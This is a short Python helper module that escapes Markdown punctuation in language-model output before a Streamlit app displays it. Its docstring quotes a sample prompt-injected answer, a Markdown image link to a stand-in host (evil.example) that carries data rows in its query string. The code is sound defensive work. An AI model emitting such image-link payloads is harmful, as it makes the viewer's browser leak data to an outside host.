"""Display helpers for text that comes from the language model."""

import re

# CommonMark lets a backslash escape any ASCII punctuation character.
_PUNCTUATION = re.compile(r"([!-/:-@\[-`{-~])")


def escape_markdown(text: str) -> str:
    r"""Return ``text`` so Streamlit shows it literally: no links, images, HTML or styling.

    Model output is rendered inside alert boxes that interpret Markdown. A prompt-injected
    answer such as ``![x](https://evil.example/p.png?d=<rows>)`` would make the viewer's
    browser fetch that URL. Escaping every ASCII punctuation character with a backslash
    (``\!\[x\]\(https\:...``) displays the same characters but makes none of them syntax.
    Letters, digits, spaces, newlines and non-ASCII text (including emoji) are unchanged.
    """
    return _PUNCTUATION.sub(r"\\\1", text)
